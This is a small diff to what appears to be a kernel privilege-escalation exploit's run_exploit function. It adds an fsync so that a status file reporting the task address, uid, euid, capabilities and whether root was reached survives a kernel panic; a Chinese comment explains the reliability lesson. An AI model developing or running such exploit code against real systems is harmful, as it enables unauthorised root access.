@@ -721,6 +721,9 @@ int run_exploit(int argc, char **argv) {
             if (sfd >= 0) {
               dprintf(sfd, "task=%016zx uid=%d euid=%d CapEff=%016llx root_seen=%d\n",
                       (size_t)my_task, ruid, euid, capeff, root_seen);
+              /* mt51: fsync — panic 杀页缓存, 不落盘的检测通道在崩溃后等于
+               * 不存在 (CRASH_HEALTHY_ENV 全灭教训). 轮询间隔 ~百 ms, 代价可忽略 */
+              fsync(sfd);
               close(sfd);
             }
           }
